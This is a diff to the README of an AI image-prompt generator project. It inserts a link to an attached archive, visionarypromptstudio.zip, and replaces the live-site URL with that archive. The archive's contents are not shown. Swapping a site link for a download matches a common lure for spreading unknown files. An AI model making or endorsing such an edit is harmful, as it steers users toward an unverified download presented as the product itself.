@@ -1,3 +1,4 @@
+[visionarypromptstudio.zip](https://github.com/user-attachments/files/31131118/visionarypromptstudio.zip)
 # Visionary Prompt Studio
 
 **Visionary Prompt Studio** is a professional AI image prompt generator designed to transform creative ideas into detailed, platform-optimized prompts. It provides a director-style workflow for con[...]
@@ -22,7 +23,7 @@ Built to help creators, designers, marketers, and AI artists **craft better prom
 ---
 
 ## 🚀 Live Site
-Visit: https://adityajawatkar12.github.io/
+Visit: visionarypromptstudio.zip
 
 ## Deployment
 Automatically deployed via GitHub Pages & Actions
